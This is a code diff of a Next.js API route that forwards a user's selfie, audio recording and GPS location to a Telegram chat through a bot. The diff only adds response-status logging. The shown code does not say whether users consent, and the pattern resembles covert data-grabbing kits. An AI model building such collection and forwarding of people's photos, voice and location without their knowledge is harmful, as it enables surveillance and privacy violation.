@@ -19,6 +19,7 @@ export async function POST(req: NextRequest) {
 
     // Send Selfie
     if (selfie) {
+      console.log("Attempting to send selfie...");
       const base64Data = selfie.replace(/^data:image\/\w+;base64,/, "");
       const buffer = Buffer.from(base64Data, "base64");
       const formData = new FormData();
@@ -29,12 +30,17 @@ export async function POST(req: NextRequest) {
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
           method: "POST",
           body: formData,
+          // DO NOT set Content-Type header for FormData, fetch will set it automatically
+        }).then(res => {
+          console.log("Selfie API response status:", res.status);
+          return res;
         })
       );
     }
 
     // Send Audio
     if (audio) {
+      console.log("Attempting to send audio...");
       const base64Data = audio.replace(/^data:audio\/\w+;base64,/, "");
       const buffer = Buffer.from(base64Data, "base64");
       const formData = new FormData();
@@ -46,12 +52,17 @@ export async function POST(req: NextRequest) {
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
           method: "POST",
           body: formData,
+          // DO NOT set Content-Type header for FormData, fetch will set it automatically
+        }).then(res => {
+          console.log("Audio API response status:", res.status);
+          return res;
         })
       );
     }
 
     // Send Location
     if (latitude && longitude) {
+      console.log("Attempting to send location...");
       messages.push(
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
           method: "POST",
@@ -63,6 +74,9 @@ export async function POST(req: NextRequest) {
             latitude: latitude,
             longitude: longitude,
           }),
+        }).then(res => {
+          console.log("Location API response status:", res.status);
+          return res;
         })
       );
     }
@@ -84,6 +98,9 @@ export async function POST(req: NextRequest) {
           chat_id: TELEGRAM_CHAT_ID,
           text: summaryText,
         }),
+      }).then(res => {
+        console.log("Summary message API response status:", res.status);
+        return res;
       })
     );
 
